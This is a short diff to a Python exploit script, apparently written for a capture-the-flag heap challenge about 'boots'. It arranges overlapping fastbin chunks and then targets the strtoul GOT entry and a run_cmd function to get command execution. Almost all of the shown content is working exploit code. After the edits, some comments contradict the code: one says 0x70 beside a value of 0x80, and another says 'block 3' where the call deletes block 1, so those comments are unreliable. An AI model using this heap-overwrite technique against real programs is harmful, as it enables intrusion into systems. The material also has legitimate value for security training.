@@ -108,7 +108,7 @@ def stage_2_create_and_shrink(target):
 def stage_3_make_smaller_chunks_in_freed_block(target):
     #for debugging, lets read the boots here after stage
     create_new_boot(target, 0x100, '44444')
-    create_new_boot(target, 0x70, '55555') #making this 0x70 instead of 0x80 because 0x80 doesn't make a fastbin chunk
+    create_new_boot(target, 0x80, '55555') #making this 0x70 instead of 0x80 because 0x80 doesn't make a fastbin chunk
     print 'Stage 3: Hole Overwritten'
     read_boot(target, 0)
 
@@ -116,12 +116,16 @@ def stage_3_make_smaller_chunks_in_freed_block(target):
 def stage_4_free_blocks(target):
     #for debugging, lets read the boots here after stage
     delete_boot(target, 2) #delete 4 above
-    delete_boot(target, 3) #delete last block 3 above
+    delete_boot(target, 1) #delete last block 3 above
     print 'Stage 4: Last Boots Deleted'
     read_boot(target, 0)
 
 
 def stage_5_create_overlapping_object(target):
+    create_new_boot(target, 0x100, '6'*0x50)
+    print 'Stage 5: Overlapping Object Created'
+    read_boot(target, 0)
+
     addr_strtoul    = p64(e.got['strtoul'])
     addr_runcmd     = p64(e.symbols['run_cmd'])
 
